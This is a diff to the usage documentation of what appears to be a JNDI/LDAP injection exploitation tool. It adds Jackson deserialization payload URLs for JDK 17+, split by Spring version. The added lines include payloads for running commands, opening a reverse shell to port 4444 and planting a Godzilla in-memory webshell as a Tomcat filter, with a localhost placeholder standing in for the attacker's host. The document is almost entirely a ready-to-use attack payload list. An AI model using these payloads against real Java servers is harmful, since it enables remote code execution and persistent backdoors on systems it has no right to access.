@@ -548,9 +548,24 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/MemShell/Tomcat/Godzilla/F
 
 # Jackson 反序列化
 # 使用 JdkDynamicAopProxy 优化不稳定性问题, 需要 spring-aop 依赖
+
+# 适用于 JDK 8
 ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Deserialize/Jackson/MemShell/Tomcat/Godzilla/Filter
+
+# 适用于 JDK 17+
+# 因为 DefaultAdvisorChainFactory 在 Spring 6.0.10 版本前后的 serialVersionUID 不同, 所以分为两个版本
+
+# Jackson17A: Spring < 6.0.10
+ldap://127.0.0.1:1389/Deserialize/Jackson17A/Command/open -a Calculator
+ldap://127.0.0.1:1389/Deserialize/Jackson17A/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/Jackson17A/MemShell/Tomcat/Godzilla/Filter
+
+# Jackson17B: Spring >= 6.0.10
+ldap://127.0.0.1:1389/Deserialize/Jackson17B/Command/open -a Calculator
+ldap://127.0.0.1:1389/Deserialize/Jackson17B/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/Jackson17B/MemShell/Tomcat/Godzilla/Filter
 
 # Fastjson 反序列化
 
